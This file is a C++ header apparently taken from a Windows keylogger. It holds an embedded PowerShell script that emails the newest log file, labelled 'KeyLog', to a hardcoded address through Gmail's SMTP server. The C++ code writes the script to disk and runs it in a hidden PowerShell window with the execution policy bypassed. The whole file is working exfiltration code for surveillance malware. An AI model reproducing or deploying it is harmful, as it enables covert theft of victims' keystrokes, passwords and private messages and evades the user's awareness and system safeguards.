#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include <Windows.h>
#include "IO.h"
#include "Timer.h"
#include "helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail
{
    #define X_EM_TO "ichwang@npcore.com"
    #define X_EM_FROM "neogeoss1@npcore.com"
    #define X_EM_PASS "******"

    const std::string &PowerShellScript =
                        "$attchmnt = gci | sort LastWriteTime | select -last 1\r\n\r\n\r\n\r\nFunction Send-EMail {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        [String]$EmailTo,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        [String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        [String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        [String]$EmailFrom=\"myself@gmail.com\",  #This gives a default value to the $EmailFrom command\r\n        [Parameter(`\r\n            mandatory=$false)]\r\n        [String]$attachment,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        [String]$Password\r\n    )\r\n\r\n        $SMTPServer = \"smtp.gmail.com\" \r\n        $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)\r\n        if ($attachment -ne $null) {\r\n            $SMTPattachment = New-Object System.Net.Mail.Attachment($attachment)\r\n            $SMTPMessage.Attachments.Add($SMTPattachment)\r\n        }\r\n        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) \r\n        $SMTPClient.EnableSsl = $true \r\n        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom.Split(\"@\")[0], $Password); \r\n        $SMTPClient.Send($SMTPMessage)\r\n        Remove-Variable -Name SMTPClient\r\n        Remove-Variable -Name Password\r\n\r\n} #End Function Send-EMail\r\n\r\nSend-EMail -EmailTo \""+  std::string (X_EM_TO) +"\" -EmailFrom \""+ std::string (X_EM_FROM) +"\" -Body \"Keylog\" -Subject \"KeyLog\" -attachment $attchmnt.name -password \"" + std::string (X_EM_PASS) + "\"";


#undef X_EM_FROM
#undef X_EM_TO
#undef X_EM_PASS


        std::string StringReplace(std::string s, const std::string &what, const std::string &with)
        {
            if(what.empty())
                return s;

            size_t sp = 0;

            while((sp = s.find(what, sp)) != std::string::npos)
            {
                s.replace(sp, what.length(), with), sp += with.length();
            }
            return s;

        }

        bool CheckFileExists(const std::string &f)
        {
            std::ifstream file (f);
            return (bool) file;
        }

        bool CreateScript()
        {
            std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

            if(!script)
                return false;

            script << PowerShellScript;

            if(!script)
                return false;

            script.close();

            return true;
        }

        Timer m_timer;

        int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
        {
            bool ok;

            ok = IO::MKDir(IO::GetOurPath(true));
            if(!ok)
                return -1;

            std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);

            if(!CheckFileExists(scr_path))
                ok=CreateScript();

            if(!ok)
                return -2;

            std::string param = "-ExecutionPolicy Bypass -File \"" + scr_path + "\" -Subj \""
                                + StringReplace(subject, "\"", "\\\"") +
                                "\" -Body \""
                                + StringReplace(body, "\"", "\\\"") +
                                "\" -Att \"" + attachments + "\"";

            SHELLEXECUTEINFO ShExecInfo = {0};
            ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
            ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
            ShExecInfo.hwnd = NULL;
            ShExecInfo.lpVerb = "open";
            ShExecInfo.lpFile = "powershell";
            ShExecInfo.lpParameters = param.c_str();
            ShExecInfo.lpDirectory = NULL;
            ShExecInfo.nShow = SW_HIDE;
            ShExecInfo.hInstApp = NULL;

            ok = (bool) ShellExecuteEx(&ShExecInfo);
            if(!ok)
                return -3;

            WaitForSingleObject(ShExecInfo.hProcess, 7000);
            DWORD exit_code = 100;

            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

            m_timer.setFunction([&]()
            {
                WaitForSingleObject(ShExecInfo.hProcess, 60000);
                GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
                if((int)exit_code == STILL_ACTIVE)
                    TerminateProcess(ShExecInfo.hProcess, 100);

                Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
            });

            m_timer.RepeatCount(1L);
            m_timer.SetInterval(10L);
            m_timer.Start(true);
            return (int)exit_code;

        }

        int SendMail(const std::string &subject, const std::string &body,
                     const std::vector<std::string> &att)
        {
            std::string attachments = "";
            if(att.size() == 1U)
                attachments=att.at(0);
            else
            {
                for(const auto &v : att)
                    attachments += v + "::";

                attachments = attachments.substr(0, attachments.length() - 2);

            }

            return SendMail(subject, body, attachments);
        }


}

#endif // SENDMAIL_H
